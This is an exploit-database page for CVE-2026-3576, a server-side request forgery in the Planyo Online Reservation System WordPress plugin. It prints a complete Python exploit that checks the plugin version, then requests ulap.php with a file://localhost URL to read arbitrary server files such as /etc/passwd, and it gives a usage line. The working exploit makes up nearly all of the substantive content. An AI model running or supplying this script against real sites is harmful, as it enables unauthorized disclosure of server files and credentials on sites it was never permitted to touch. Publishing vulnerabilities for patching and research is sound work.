---
title: Planyo_Online_Reservation_System  3.0 Arbitrary File Read via SSRF
url: https://cxsecurity.com/issue/WLB-2026090012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-26
fetch_date: 2026-09-27T07:24:25.479505
---

# Planyo_Online_Reservation_System  3.0 Arbitrary File Read via SSRF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Planyo\_Online\_Reservation\_System 3.0 Arbitrary File Read via SSRF** **2026.09.26**  Credit:  **[Balachandar Gowrisankar](https://cxsecurity.com/author/Balachandar%2BGowrisankar/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-3576](https://cxsecurity.com/cveshow/CVE-2026-3576/ "Click to see CVE-2026-3576")**  CWE: **[CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")** | |

# Exploit Title: Planyo\_Online\_Reservation\_System 3.0 - Arbitrary File Read via SSRF
# Date: 12-07-2026
# Exploit Author: Balachandar Gowrisankar
# Vendor Homepage: https://www.planyo.com/wordpress-reservation-system/
# Software Link: https://plugins.svn.wordpress.org/planyo-online-reservation-system/tags/2.9/
# Version: <= 3.0
# Tested on: Kali GNU/Linux Rolling, Wordpress 7.0.1, Apache 2.4.68, Python 3.13.14
# CVE: CVE-2026-3576
# CVSS Score: 7.2
# Usage: python exploit.py http://127.0.0.1/wordpress/ -f /etc/passwd
import argparse
import requests
import re
def version\_check(base\_url):
readme\_url = base\_url + "wp-content/plugins/planyo-online-reservation-system/readme.txt"
response = requests.get(readme\_url)
text = response.text
match = re.search(r"==\s\*Changelog\s\*==(.\*)", text, re.DOTALL | re.IGNORECASE)
if match:
changelog = match.group(1)
versions = re.findall(r"=\s\*v?([A-Za-z0-9.\_-]+)\s\*=", changelog)
if versions:
print("[+] Version found:", versions[-1])
if versions[-1] in ['1.0', '1.1', '1.1.1', '1.2', '1.3', '1.5', '1.6', '1.7', '1.8', '2.3', '2.6', '2.7', '2.8', '2.9', '3.0']:
print("[+] Target is vulnerable")
else:
print("[-] Target is not vulnerable. Exiting.")
exit()
else:
print("[-] No versions found. Try skipping version check to see if exploit still works.")
exit()
else:
print("[-] No changelog section found. Try skipping version check to see if exploit still works.")
exit()
def read\_file(base\_url, file):
target\_url = base\_url + "wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap\_url=file://localhost" + file
try:
response = requests.get(target\_url)
response.raise\_for\_status()
print(response.text)
except requests.exceptions.HTTPError as e:
print(e)
def main():
parser = argparse.ArgumentParser(description="Exploit for CVE-2026-3576")
parser.add\_argument("base\_url", help="Target wordpress root directory(eg: http://localhost/wordpress/)")
parser.add\_argument("-f", "--file", type=str, default="/etc/passwd", help="Location of arbitrary file on target. Default: /etc/passwd")
parser.add\_argument("-d", "--disable-check", action="store\_true", help="Disable target vulnerability check. Default: False")
args = parser.parse\_args()
if not args.disable\_check:
print("[\*] Checking if target is vulnerable...")
version\_check(args.base\_url)
print("\n[\*] Attempting to read arbitrary file...\n")
read\_file(args.base\_url, args.file)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026090012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top